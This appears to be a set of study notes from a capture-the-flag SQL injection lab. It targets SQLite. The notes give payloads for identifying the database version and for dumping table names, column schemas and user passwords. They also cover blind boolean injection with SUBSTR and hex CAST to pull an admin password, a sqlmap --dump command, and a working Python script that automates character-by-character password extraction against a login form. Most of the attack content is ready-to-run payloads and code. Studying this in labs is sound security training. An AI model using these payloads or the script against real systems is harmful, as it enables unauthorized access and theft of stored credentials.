# Quaries for Dump from SQLlite Database


********** 

### With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```



**The ```group_concat()``` function is used to dump all the tables simultaneously.**

```
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

We can then continue by ```extract all the column names``` from the usertable:

```
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'
```

### By knowing the names of the columns, we can extract the data we want from the database. 


```
SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable
```

# Broken Authentication (Blind Injection)

The first argument to [substr](https://sqlite.org/lang_corefunc.html#substr) is the string itself, which will be the admin's password. The second argument is the starting position, and the third argument is the length of the substring that will be returned.

```SUBSTR( string, <start>, <length>)```

Below is an example of substr in action - the character after the equal (=) sign demonstrates the substring returned.

```
-- Changing start
SUBSTR("THM{Blind}", 1,1) = T
SUBSTR("THM{Blind}", 2,1) = H
SUBSTR("THM{Blind}", 3,1) = M

-- Changing length
SUBSTR("THM{Blind}", 1,3) = THM
```

The next step will be to enter the admin's password as a string into the substr function. This can be achieved with the following query:

```
(SELECT password FROM users LIMIT 0,1)
```

The [LIMIT](https://sqlite.org/lang_select.html#limitoffset) clause is used to limit the amount of data returned by the SELECT statement. The first number, 0, is the offset and the second integer is the limit:

```
LIMIT <OFFSET>, <LIMIT>
```

Below are a few examples of the LIMIT clause in action. The right table represents the user table.

```
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1)
```

```
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'
```

However, whether this approach works or not will be depending on how the application handles the inputs. The application will convert the username to lowercase for this challenge, which breaks the mentioned approach since capital T is not the same as lowercase t. The hex representation of ASCII T is 0x54 and 0x74 for lowercase t. To deal with this, we can input our character as hex representation via the substitution type X and then use SQLite's CAST expression to convert the value to the datatype the database expects.

"x,X: The argument is an integer which is displayed in hexadecimal. Lower-case hexadecimal is used for %x and upper-case is used for %X" - (sqlite.org)

This means that we can input T as ```X'54'```. To convert the value to SQLite's Text type, we can use the CAST expression as follows: CAST(X'54' as Text). Our final query now looks as follows:

```
SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)
```

Payload:

```
admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
```


note that it will be necessary to change the password length with the password_len variable. The length of the password can be found by asking the database. For example, in the query below, we ask the database if the length of the password equals 37:

```
admin' AND length((SELECT password from users where username='admin'))==37-- -
```


### We can using automation tool for this task like sqlmap:

```
sqlmap -u link --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump
```

### Code python for automation blind Injection:

```
#!/usr/bin/python3
import sys
import requests
import string


def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text


def main(addr):
    url = f"http://{addr}/challenge3/login"
    flag = ""
    password_len = 38
    # Not the most efficient way of doing it...
    for i in range(1, password_len):
        for c in string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}":
            # Convert char to hex and remove "0x"
            h = hex(ord(c))[2:]
            query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
                f"{i},1)=CAST(X'{h}' AS TEXT)--"

            resp = send_p(url, query)
            if not "Invalid" in resp:
                flag += c
                print(flag)
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
```
